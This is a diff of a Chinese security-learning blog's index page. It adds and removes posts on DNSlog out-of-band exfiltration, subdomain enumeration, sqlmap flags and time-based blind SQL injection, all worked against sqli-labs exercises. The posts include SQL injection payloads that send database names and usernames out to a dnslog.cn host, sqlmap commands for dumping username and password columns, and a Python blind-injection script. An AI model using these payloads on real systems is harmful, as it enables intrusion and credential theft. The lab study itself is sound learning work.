@@ -148,6 +148,368 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2022/07/11/DNSlog/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="微风">
+      <meta itemprop="description" content="微风的学习记录">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Breeze">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/07/11/DNSlog/" class="post-title-link" itemprop="url">DNSlog</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-11 21:46:42" itemprop="dateCreated datePublished" datetime="2022-07-11T21:46:42+08:00">2022-07-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-09-05 15:46:36" itemprop="dateModified" datetime="2022-09-05T15:46:36+08:00">2022-09-05</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>首先我们知道DNS是起ip与域名的解析的服务，通过ip可以解析到对应的域名。DNSlog就是储存在DNS上的域名相关的信息，它记录着你对域名或者IP的访问信息，也就是类似于日志文件，</p>
+<h3 id="DNSlog回显原理"><a href="#DNSlog回显原理" class="headerlink" title="DNSlog回显原理"></a>DNSlog回显原理</h3><p>首先了解一下多级域名的概念，我们知道因特网采用树状结构命名方法，按组织结构划分域是一个名字空间中一个被管理的划分，域可划分为子域，子域再可被划分为多级域名称为一级域名，二级域名，三级域名，从一个域名地址来从右到左依次是顶级域名，二级域名，三级域名,例如 gaobai.kxsy.com,<br>通俗的说就是我有个域名kxsy.work，我将域名设置对应的ip 2.2.2.2 上，这样当我向dns服务器发起kxsy.work的解析请求时，DNSlog中会记录下他给kxsy.work解析，解析值为2.2.2.2，而我们这个解析的记录的值就是我们要利用的地方,这个过程被记录下来就是DNSlog</p>
+<h3 id="DNSlog-应用"><a href="#DNSlog-应用" class="headerlink" title="DNSlog 应用"></a>DNSlog 应用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.SQL盲注</span><br><span class="line">2.无回显的XSS</span><br><span class="line">3.无回显的命令执行</span><br><span class="line">5.无回显的SSRF</span><br><span class="line">5.Blind XXE</span><br></pre></td></tr></table></figure>
+
+<p><strong>SQL盲注</strong>无论时时间盲注还是布尔盲注，都需要发送大量的数据包去判断数据，很容易导致被waf封IP，如果条件允许的话，可以使用dnslog进行快速的数据外带。以Mysql为例，通过dnslog外带数据需要用到load_file函数，所以一般得是root权限，并且secure_file_priv得为空</p>
+<h4 id="免费dns解析记录网站"><a href="#免费dns解析记录网站" class="headerlink" title="免费dns解析记录网站"></a>免费dns解析记录网站</h4><p><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn</a><br><a target="_blank" rel="noopener" href="http://admin.dnslog.link/">http://admin.dnslog.link</a><br><a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io</a></p>
+<h3 id="DNSlog注入实例演练"><a href="#DNSlog注入实例演练" class="headerlink" title="DNSlog注入实例演练"></a>DNSlog注入实例演练</h3><p>1.在dnslog网站申请一个dnslog域名：h30qdp.dnslog.cn</p>
+<p><img src="C:\博客\source\pic\dnslog.png" alt="dnslog"></p>
+<p>2.打开sqilab-8</p>
+<p>​    构造语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-8/?id=1%27union%20select%201,2,load_file(concat(%27//%27,(select%20database()),%27.h30qdp.dnslog.cn</span><br></pre></td></tr></table></figure>
+
+<p>![屏幕截图 2022-09-05 153113](C:\博客\source\pic\屏幕截图 2022-09-05 153113.png)</p>
+<p>执行后获得</p>
+<p>![屏幕截图 2022-09-05 153030](C:\博客\source\pic\屏幕截图 2022-09-05 153030.png)</p>
+<p>修改子查询里的内容，获取其他数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;union select 1,2,load_file(concat(&#x27;//&#x27;,(select username form users limit 0,1),&#x27;.9u77ed.dnslog.cn/abc&#x27;))#</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2022/04/16/%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="微风">
+      <meta itemprop="description" content="微风的学习记录">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Breeze">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/04/16/%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4/" class="post-title-link" itemprop="url">子域名爆破</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-04-16 08:17:35 / 修改时间：08:45:43" itemprop="dateCreated datePublished" datetime="2022-04-16T08:17:35+08:00">2022-04-16</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>域名的形式：</p>
+<p><strong>zkaq.cn    顶级域名(一级)</strong></p>
+<p><strong>a.zkaq.cn 二级域名</strong></p>
+<p><strong>b.a.zkaq.cn  三级域名</strong></p>
+<p>根据点的多少来判断他是几级域名</p>
+<p><strong>二级域名</strong>就是<strong>一级域名的子域名</strong></p>
+<p><strong>三级是二级的子域名</strong></p>
+<p><em>一、通常情况下，一般主站的防御会很严，但是他的子站安全性可能不会那么全面</em></p>
+<p><em>二、同一个域名下的二级域名都属于相同资产，一般而言都有相关的联系，因此可以扩大攻击范围</em></p>
+<h3 id="运用在线的子域名搜索网站"><a href="#运用在线的子域名搜索网站" class="headerlink" title="运用在线的子域名搜索网站"></a>运用在线的子域名搜索网站</h3><p><strong>一、运用搜索引擎（谷歌语法）</strong></p>
+<p>site:qq.com （搜索qq.com下面的所有子域名）</p>
+<p><strong>二、证书搜索</strong></p>
+<p>基于SSL证书查询子域：<a target="_blank" rel="noopener" href="https://crt.sh/">https://crt.sh/</a></p>
+<p><strong>三、查询Dns的解析记录</strong></p>
+<p>基于DNS记录查询子域：<a target="_blank" rel="noopener" href="https://dns.bufferover.run/dns?q=">https://dns.bufferover.run/dns?q=</a></p>
+<p><strong>四、在线爆破枚举子域</strong>：<a target="_blank" rel="noopener" href="http://phpinfo.me/domain/">http://phpinfo.me/domain/</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2022/04/10/SQLmap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="微风">
+      <meta itemprop="description" content="微风的学习记录">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Breeze">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/04/10/SQLmap/" class="post-title-link" itemprop="url">SQLmap</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-04-10 10:44:44 / 修改时间：16:10:02" itemprop="dateCreated datePublished" datetime="2022-04-10T10:44:44+08:00">2022-04-10</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="Sqlmap注入的命令参数"><a href="#Sqlmap注入的命令参数" class="headerlink" title="Sqlmap注入的命令参数"></a>Sqlmap注入的命令参数</h3><p><strong><u>1、判断注入点</u>：</strong>sqlmap -u url（目标地址）<br>    -u：指定地址</p>
+<p><strong><u>2、爆破数据库名</u><strong>：sqlmap -u <a target="_blank" rel="noopener" href="http://xxx.com/?id=1">http://xxx.com/?id=1</a> –dbs<br>    <strong>–dbs：查看所有数据库名</strong><br>    <strong>–current-db</strong>：</strong>查看当前使用的数据库</strong></p>
+<p><strong><u>3、爆破数据表名</u>：</strong>sqlmap -u <a target="_blank" rel="noopener" href="http://xxx.com/?id=1">http://xxx.com/?id=1</a> –D 库名 –tables<br>    -D：指定数据库名<br>    –tables：查看指定库下面的所有的表名</p>
+<p><u><strong>4、爆破字段名</strong></u><br>   sqlmap. -u <a target="_blank" rel="noopener" href="http://xxx.com/?id=1">http://xxx.com/?id=1</a> -D 库名 –T 表名 –columns<br>     -T:指定表名<br>     –columns:查看指定库的表中的所有字段名</p>
+<p><u><strong>5、爆破所有数据</strong></u><br>    sqlmap. -u <a target="_blank" rel="noopener" href="http://xxx.com/?id=1">http://xxx.com/?id=1</a> -D 库名 -T 表名 -C 字段名 –dump<br>     -C：指定字段名<br>     –dump：根据指定的库、表、字段爆破里面的数据</p>
+<p>同时查username，password：sqlmap -u  <a target="_blank" rel="noopener" href="http://xxx.com/?id=1">http://xxx.com/?id=1</a> -D 库名 -T 表名 -C username,password –dump</p>
+<h4 id="Sqlmap对伪静态进行注入"><a href="#Sqlmap对伪静态进行注入" class="headerlink" title="Sqlmap对伪静态进行注入"></a>Sqlmap对伪静态进行注入</h4><p><strong>使用方式</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap. -u http://xxx.com/abc/1*.html --dbs</span><br><span class="line">	    (* 表示指定注入点)</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Sqlmap对登陆框（表单）进行注入"><a href="#Sqlmap对登陆框（表单）进行注入" class="headerlink" title="Sqlmap对登陆框（表单）进行注入"></a>Sqlmap对登陆框（表单）进行注入</h4><p><strong>使用方式</strong>：sqlmap. -u <a target="_blank" rel="noopener" href="http://xxx.com/admin/index.php">http://xxx.com/admin/index.php</a> –form</p>
+<p>然后 sqlmap. -u <a target="_blank" rel="noopener" href="http://xxx.com/admin/index.php">http://xxx.com/admin/index.php</a> –form –dbs</p>
+<p>然后重复查表查列的过程</p>
+<p>其他命令参数：<br><strong>–batch</strong>：自动选择    （帮你按回车）</p>
+<p><strong>–flush-session</strong>：清除缓存 //简写 –z flu</p>
+<p><strong>–level</strong>:共有五个等级，默认为1，等级越高，测试的内容也越多</p>
+<p><strong>–risk</strong>：共有四个风险等级，默认是1，等级越高，用来测试的语句也更多</p>
+<p><strong>-v</strong>：显示详细扫描信息，共有5个等级（等级越高显示越详细）</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2022/02/25/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="微风">
+      <meta itemprop="description" content="微风的学习记录">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Breeze">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/25/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" class="post-title-link" itemprop="url">时间盲注</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-02-25 14:07:36 / 修改时间：22:05:01" itemprop="dateCreated datePublished" datetime="2022-02-25T14:07:36+08:00">2022-02-25</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#x27; and sleep(5)--+</span><br></pre></td></tr></table></figure>
+
+<p>发现明显延迟，说明语句构造正确</p>
+<p>接下来的思路是通过延迟，依次爆破数据库长度，数据库名，表名，列名，以及字段</p>
+<p>?id=1’ and if(length(database())=8,sleep(5),1)–+</p>
+<p><img src="https://s2.loli.net/2022/02/25/4vCBm5l736Ysped.png"></p>
+<p>明显延迟，数据库长度为8.</p>
+<p>?id=1’ and if( left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=’r’ ,sleep(5),1)–+</p>
+<p>未完待续。。。。。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2022/02/24/requests/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="微风">
+      <meta itemprop="description" content="微风的学习记录">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Breeze">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/24/requests/" class="post-title-link" itemprop="url">requests</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-02-24 16:31:05 / 修改时间：20:51:26" itemprop="dateCreated datePublished" datetime="2022-02-24T16:31:05+08:00">2022-02-24</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>python的一个库</p>
+<p>写脚本需要用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">w=requests.get(<span class="string">&#x27;https://www.bilibili.com&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(w.status_code) <span class="comment">#打印返回的状态码（200）</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2022/02/23/%E7%88%86%E7%A0%B4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -523,343 +885,6 @@ class选择器 ，表现形式： .class名 &#123;属性：值&#125; ，ps：使
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2022/01/17/Python%20%E7%9A%84%E6%95%B4%E6%95%B0%E6%98%AF%E4%B8%8D%E5%8F%AF%E5%8F%98%E7%B1%BB%E5%9E%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="微风">
-      <meta itemprop="description" content="微风的学习记录">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Breeze">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/01/17/Python%20%E7%9A%84%E6%95%B4%E6%95%B0%E6%98%AF%E4%B8%8D%E5%8F%AF%E5%8F%98%E7%B1%BB%E5%9E%8B/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-01-17 09:22:04" itemprop="dateCreated datePublished" datetime="2022-01-17T09:22:04+08:00">2022-01-17</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="Python-的整数是不可变类型"><a href="#Python-的整数是不可变类型" class="headerlink" title="Python 的整数是不可变类型"></a><strong>Python 的整数是不可变类型</strong></h3><ul>
-<li>C 之类的语言（写法 <code>int i = 1000</code>）会申请一块内存空间，并给它“绑定”一个固定的名称 i，同时写入一个可变的值 1000。在这里，i 的地址以及类型是固定的，而值是可变的（在一定的表示范围内）</li>
-<li>Python（写法<code>i = 1000</code>）也会申请一块内存空间，但是它会“绑定”给数字 1000，即这个 1000 的地址以及类型是固定的，至于 i，只是一个名称标签贴在 1000 上，自身没有固定的地址和类型</li>
-</ul>
-<p><em>所以当我们令 i “自增”时（i = i + 1），它们的处理是不同的：</em></p>
-<ul>
-<li>C 之类的语言先找到 i 的地址上存的数值，然后令它加 1，操作后新的数值就取代了旧的数值</li>
-<li>Python 的操作过程是把 i 指向的数字加 1，然后把结果绑定到新申请的一块内存空间，再把名称标签 i “贴”到新的数字上。新旧数字可以同时存在，不是取代关系</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2021/12/11/%E7%BA%A2%E8%89%B2%E7%88%B1%E5%BF%83%E4%BB%A3%E7%A0%81/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="微风">
-      <meta itemprop="description" content="微风的学习记录">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Breeze">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/11/%E7%BA%A2%E8%89%B2%E7%88%B1%E5%BF%83%E4%BB%A3%E7%A0%81/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-12-11 22:49:10" itemprop="dateCreated datePublished" datetime="2021-12-11T22:49:10+08:00">2021-12-11</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="红色爱心代码"><a href="#红色爱心代码" class="headerlink" title="红色爱心代码"></a>红色爱心代码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">float</span> x, y, a;</span><br><span class="line">	<span class="keyword">for</span> (y = <span class="number">1.5</span>; y &gt; <span class="number">-1.5</span>; y-=<span class="number">0.1</span>) &#123;</span><br><span class="line">		<span class="keyword">for</span> (x = <span class="number">-1.5</span>; x &lt; <span class="number">1.5</span>; x+=<span class="number">0.05</span>)&#123;</span><br><span class="line">		a = x * x + y * y - <span class="number">1</span>;</span><br><span class="line">		<span class="built_in">putchar</span>(a * a * a - x * x * y * y * y &lt;= <span class="number">0.0</span>?<span class="string">&#x27;*&#x27;</span>:<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	system(<span class="string">&quot;color 0c&quot;</span>);</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2021/11/21/lab%208/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="微风">
-      <meta itemprop="description" content="微风的学习记录">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Breeze">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/21/lab%208/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-11-21 17:53:43" itemprop="dateCreated datePublished" datetime="2021-11-21T17:53:43+08:00">2021-11-21</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="lab-8"><a href="#lab-8" class="headerlink" title="lab 8"></a>lab 8</h1><p>使用python脚本进行盲注</p>
-<p>1，刷出库名</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">dic=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload: and substr(database(),1,1)=&#x27;s&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> dic:</span><br><span class="line">        url=<span class="string">&quot;http://d1c0c861-091f-4ff0-9aaa-64dbc53cfc23.node4.buuoj.cn/Less-8/?id=1%27&quot;</span></span><br><span class="line">        payload=<span class="string">&quot; and substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i,char)</span><br><span class="line">        url = url + payload</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;are&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=char</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>2，刷出表名</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;and substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 2,&quot;</span> \</span><br><span class="line">          <span class="string">&quot;1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i, char)</span><br></pre></td></tr></table></figure>
-
-<p>limit  后面的数字可变 </p>
-<p>第一个表：limit 0</p>
-<p>第二个表：limit 1 </p>
-<p>……</p>
-<p>3，刷出列名</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,&quot;</span> \</span><br><span class="line">          <span class="string">&quot;1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i, char)</span><br></pre></td></tr></table></figure>
-
-<p>limit  后面的数字可变 </p>
-<p>第一列：limit 0</p>
-<p>第二列：limit 1 </p>
-<p>……</p>
-<p>4，查用户名或密码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =<span class="string">&quot;and substr((select username from security.users limit 0,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i,char)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =<span class="string">&quot;and substr((select password from security.users limit 0,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i,char)</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2021/11/19/lab/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="微风">
-      <meta itemprop="description" content="微风的学习记录">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Breeze">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/19/lab/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-11-19 14:47:57" itemprop="dateCreated datePublished" datetime="2021-11-19T14:47:57+08:00">2021-11-19</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="lab"><a href="#lab" class="headerlink" title="lab"></a>lab</h1><p>?id=10’union select 1,table_name,3 from information_schema.tables where table_schema=’security’ limit 0,1 – qwe //一个一个地查表 </p>
-<p>?id=10’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+</p>
-<p>//一次查出全部的表但是可能因为显示位不够而漏掉一些内容</p>
-<p><img src="https://i.loli.net/2021/11/19/qPmFyh4n8TeJdkb.png"></p>
-<p><img src="https://i.loli.net/2021/11/16/pTwogVcQKPFzJti.png"></p>
-<p>1.<code>?id=1&#39;</code></p>
-<p>2.输入order by语句对字段进行猜测</p>
